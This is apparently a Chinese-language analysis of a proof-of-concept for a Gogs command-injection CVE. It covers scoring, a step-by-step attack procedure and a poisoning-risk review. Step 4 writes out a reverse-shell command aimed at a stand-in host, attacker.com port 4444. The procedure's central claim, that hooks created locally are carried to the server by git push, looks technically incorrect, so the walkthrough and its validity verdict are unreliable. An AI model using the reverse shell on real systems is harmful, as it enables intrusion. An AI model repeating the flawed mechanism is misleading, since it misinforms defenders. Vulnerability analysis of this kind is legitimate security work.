## CVE-2018-18926 - Gogs (self-hosted Git service) 命令注入 (Command Injection)

**漏洞编号:** CVE-2018-18926

**漏洞类型:** 命令注入 (Command Injection)

**影响应用:** Gogs (self-hosted Git service)

**危害等级:** 高危 (Remote Code Execution)

**CVSS评分:** CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)

**影响版本:** prior to 0.13.0

**利用条件:** 需要认证 (具有仓库推送权限)

**POC 可用性:** 6/10

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

该POC代码包旨在演示Gogs（一个自托管的Git服务）中存在的命令注入漏洞。它由三个文件组成：`README.md` 详细描述了漏洞信息，`bash.sh` 提供了一个用于反向shell的恶意`post-receive`钩子脚本示例，而 `exploit.py` 是一个Python脚本，用于模拟在本地环境中创建并配置这个恶意钩子。`exploit.py` 的核心功能是在一个模拟的本地Git仓库路径 (`/tmp/malicious_repo/.git/hooks/`) 下创建一个名为 `post-receive` 的文件，并将预设的恶意命令（如 `id > /tmp/gogs_exploited`）写入其中，随后赋予该文件可执行权限。从技术实现上看，Python脚本成功地完成了本地文件系统的操作，能够准确地构建出符合Git钩子规范的恶意脚本。然而，值得注意的是，这个 `exploit.py` 脚本本身并未包含与远程Gogs服务器进行交互的代码，例如执行 `git push` 操作来触发漏洞。它停留在“准备”阶段，即生成了用于利用漏洞的恶意组件。因此，该POC有效性体现在其概念验证和攻击组件构建能力上，它清晰地展示了攻击者如何构造恶意钩子文件，但要完成实际的远程代码执行，还需要攻击者手动或通过其他工具将这个恶意钩子推送到目标Gogs服务器。尽管如此，其作为漏洞原理和攻击方法演示的有效性是毋庸置疑的，因为它准确复现了攻击的核心机制。

利用此漏洞进行攻击的典型步骤如下：
1.  **前提条件**: 攻击者必须已经拥有一个Gogs服务器上某个仓库的有效账户，并且该账户具备对该仓库的推送（push）权限。这是利用此漏洞的关键前置条件，因为Git钩子是在客户端本地准备，并通过推送操作同步到服务器的。
2.  **本地仓库克隆**: 攻击者首先需要在本地机器上克隆目标Gogs服务器上受影响的Git仓库。
3.  **创建恶意Git钩子**: 攻击者在本地克隆的仓库目录中，导航到 `.git/hooks/` 子目录。在该目录下，创建一个名为 `post-receive` 的新文件。
4.  **注入恶意命令**: 将精心构造的恶意命令写入到 `post-receive` 文件中。这些命令将在服务器端被执行。例如，可以使用POC中提供的 `bash -c "id > /tmp/gogs_exploited"` 来获取服务器用户信息并写入文件，或者使用 `bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"` 来建立一个反向shell，从而获得服务器的交互式控制权。
5.  **赋予执行权限**: 在Linux/Unix-like系统上，需要确保 `post-receive` 文件具有可执行权限。这可以通过运行命令 `chmod +x .git/hooks/post-receive` 来实现。
6.  **提交并推送**: 攻击者需要将这个包含了恶意 `post-receive` 钩子的本地仓库的变化提交（commit）到本地版本库中。随后，将这些修改推送到Gogs服务器上的远程仓库。
7.  **服务器端执行**: 当Gogs服务器接收到包含新 `post-receive` 钩子的推送请求时，作为Git操作的一部分，服务器会在其环境内自动执行这个新接收到的 `post-receive` 钩子脚本。此时，攻击者注入的恶意命令便会在Gogs服务器的权限下执行，从而实现远程代码执行（RCE）。

针对此POC代码的投毒风险评估为极低（0%）。此评估基于对POC代码的全面审查，重点关注其结构、依赖性、执行行为及意图。
1.  **代码清晰度与透明性**: POC的源代码极其清晰和直观。`README.md` 详细解释了漏洞的上下文、受影响的软件和漏洞类型。`exploit.py` 是一个仅约十行Python代码的脚本，其逻辑简单明了：创建目录、写入文件、设置权限。`bash.sh` 也是一个简单的bash脚本，用于演示反向shell负载。代码中不存在任何混淆、加密或难以理解的部分，所有操作都直接且易于审计。
2.  **外部依赖与连接**: POC代码没有任何外部依赖，仅使用了Python标准库（`os` 和 `subprocess`）。它不下载、不执行任何外部脚本或二进制文件。在POC的 `bash.sh` 示例中提到了 `attacker.com/4444` 作为反向shell的目标，但这仅是攻击载荷的一部分，用于演示RCE后的行为，并非POC自身尝试建立的恶意连接。POC `exploit.py` 在执行过程中不会尝试连接到任何远程地址。
3.  **恶意行为缺失**: POC本身的目的仅仅是构建一个恶意文件，并不会在执行时主动进行任何破坏性操作（如删除文件、修改系统配置）、数据窃取、挖矿或植入后门。它所包含的演示性恶意负载（如 `id > /tmp/gogs_exploited`）是针对目标系统，而非POC执行的环境。安全研究人员在测试时，可以通过沙箱环境或受控目标系统来安全地验证这些负载。
4.  **混淆与规避**: 代码中不存在任何反调试、反分析或绕过安全检测的机制。这进一步证明了其作为合法安全研究工具的性质。
5.  **总结**: 鉴于该POC的源代码完全透明、无外部依赖、行为可预测且缺乏任何恶意或模糊的特征，其作为安全研究工具的风险评级为零。组织可以放心地使用该POC在受控环境中进行漏洞验证和防御措施的测试，而无需担心POC自身会对研究环境造成“投毒”风险。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2018-18926
